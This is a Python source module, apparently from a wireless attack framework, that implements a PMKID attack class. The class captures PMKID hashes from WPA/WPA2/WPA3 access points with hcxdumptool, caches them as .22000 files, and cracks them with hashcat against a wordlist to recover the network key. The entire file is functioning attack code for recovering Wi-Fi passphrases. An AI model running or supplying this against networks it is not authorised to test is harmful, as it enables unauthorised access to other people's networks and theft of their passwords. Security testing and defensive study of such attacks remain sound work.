"""PMKID capture and crack attack."""

from __future__ import annotations

import os
import re
import time
from datetime import datetime, timezone

from ..models import CrackResult, EncryptionType
from ..tools.hashcat import HcxTools
from ..tools.interface import recover_interface
from .base import Attack, AttackResult


class PMKIDAttack(Attack):
    name = "pmkid"

    def can_attack(self) -> bool:
        if not self.cfg.attack.pmkid:
            return False
        if self.ap.encryption not in (EncryptionType.WPA, EncryptionType.WPA2, EncryptionType.WPA3):
            return False
        if self.ap.is_enterprise:
            return False
        return True

    def _restore_radio(self) -> None:
        iface = recover_interface(self.cfg.scan.interface, self.ap.channel)
        if iface != self.cfg.scan.interface:
            self.tracker.log(
                f"Monitor interface is now [cyan]{iface}[/] (was {self.cfg.scan.interface})",
                tag="pmkid",
            )
            self.cfg.scan.interface = iface
        self.tracker.log("Interface restored for handshake capture", tag="pmkid")

    def _existing_hash(self) -> str | None:
        hs_dir = self.cfg.output.handshake_dir
        if not os.path.isdir(hs_dir):
            return None
        bssid_target = self.ap.bssid.replace(":", "").lower()
        for fname in os.listdir(hs_dir):
            if not fname.endswith(".22000"):
                continue
            path = os.path.join(hs_dir, fname)
            with open(path) as f:
                for line in f:
                    parts = line.strip().split("*")
                    if len(parts) >= 4 and parts[3].lower().replace(":", "") == bssid_target:
                        return line.strip()
        return None

    def _save_hash(self, hash_line: str) -> str:
        essid_safe = re.sub(r"[^a-zA-Z0-9]", "", self.ap.display_name)
        bssid_safe = self.ap.bssid.replace(":", "-")
        ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%S")
        path = os.path.join(
            self.cfg.output.handshake_dir,
            f"pmkid_{essid_safe}_{bssid_safe}_{ts}.22000",
        )
        with open(path, "w") as f:
            f.write(hash_line + "\n")
        return path

    def run(self) -> AttackResult:
        self.tracker.clear_skip()
        started = time.time()
        timeout = self.cfg.attack.pmkid_timeout
        hash_line = self._existing_hash()
        capture_file = ""

        if hash_line:
            self.status("capture", "Using cached PMKID hash", timeout=timeout, started=started)
            self.tracker.log(f"Found existing hash for {self.ap.display_name}", tag="pmkid")
            capture_file = "cached"
        else:
            pcapng = os.path.join(
                self.cfg.output.data_dir,
                f"pmkid_{self.ap.bssid.replace(':', '')}.pcapng",
            )

            def on_tick(elapsed: float, pcap_kb: int):
                remaining = max(0, int(timeout - elapsed))
                self.status(
                    "capture",
                    f"hcxdumptool listening ({remaining}s left)",
                    timeout=timeout, started=started, pcap_kb=pcap_kb,
                )

            self.status("capture", "Starting hcxdumptool...", timeout=timeout, started=started)
            self.tracker.log(f"Capturing PMKID from {self.ap.bssid}...", tag="pmkid")

            try:
                hash_line = HcxTools.capture_pmkid(
                    self.ap, self.cfg.scan.interface, pcapng,
                    timeout, on_tick=on_tick,
                    on_log=lambda msg: self.tracker.log(msg, tag="pmkid"),
                    should_stop=self.should_stop,
                )
                if self.should_stop():
                    return self.skipped_result()
                if hash_line:
                    capture_file = self._save_hash(hash_line)
                    self.tracker.log("[green]PMKID hash captured![/]", tag="pmkid")
            finally:
                # Always restore the radio — hcxdumptool blocks airodump until this runs
                self._restore_radio()

        if not hash_line:
            self.status("failed", "No PMKID received", started=started)
            self.tracker.log(
                "[yellow]PMKID timed out — continuing with handshake capture[/]",
                tag="plan",
            )
            return AttackResult(False, message="PMKID capture failed")

        if self.cfg.attack.skip_crack or not self.cfg.attack.wordlist:
            self.status("done", "Hash saved (crack skipped)", started=started)
            return AttackResult(True, message="PMKID captured (crack skipped)")

        key = self.crack_hashcat(hash_line, started)
        if self.should_stop():
            return self.skipped_result()
        if key:
            crack = CrackResult(
                bssid=self.ap.bssid, essid=self.ap.display_name, key=key,
                method="pmkid", capture_file=capture_file,
                cracked_at=datetime.now(timezone.utc).isoformat(),
            )
            self.status("cracked", f"Key found: {key}", started=started)
            return AttackResult(True, crack=crack, message=f"PMKID cracked: {key}")

        self.status("failed", "Password not in wordlist", started=started)
        self.tracker.log(
            "[yellow]PMKID not cracked — continuing with handshake capture[/]",
            tag="plan",
        )
        return AttackResult(False, message="PMKID captured but not cracked")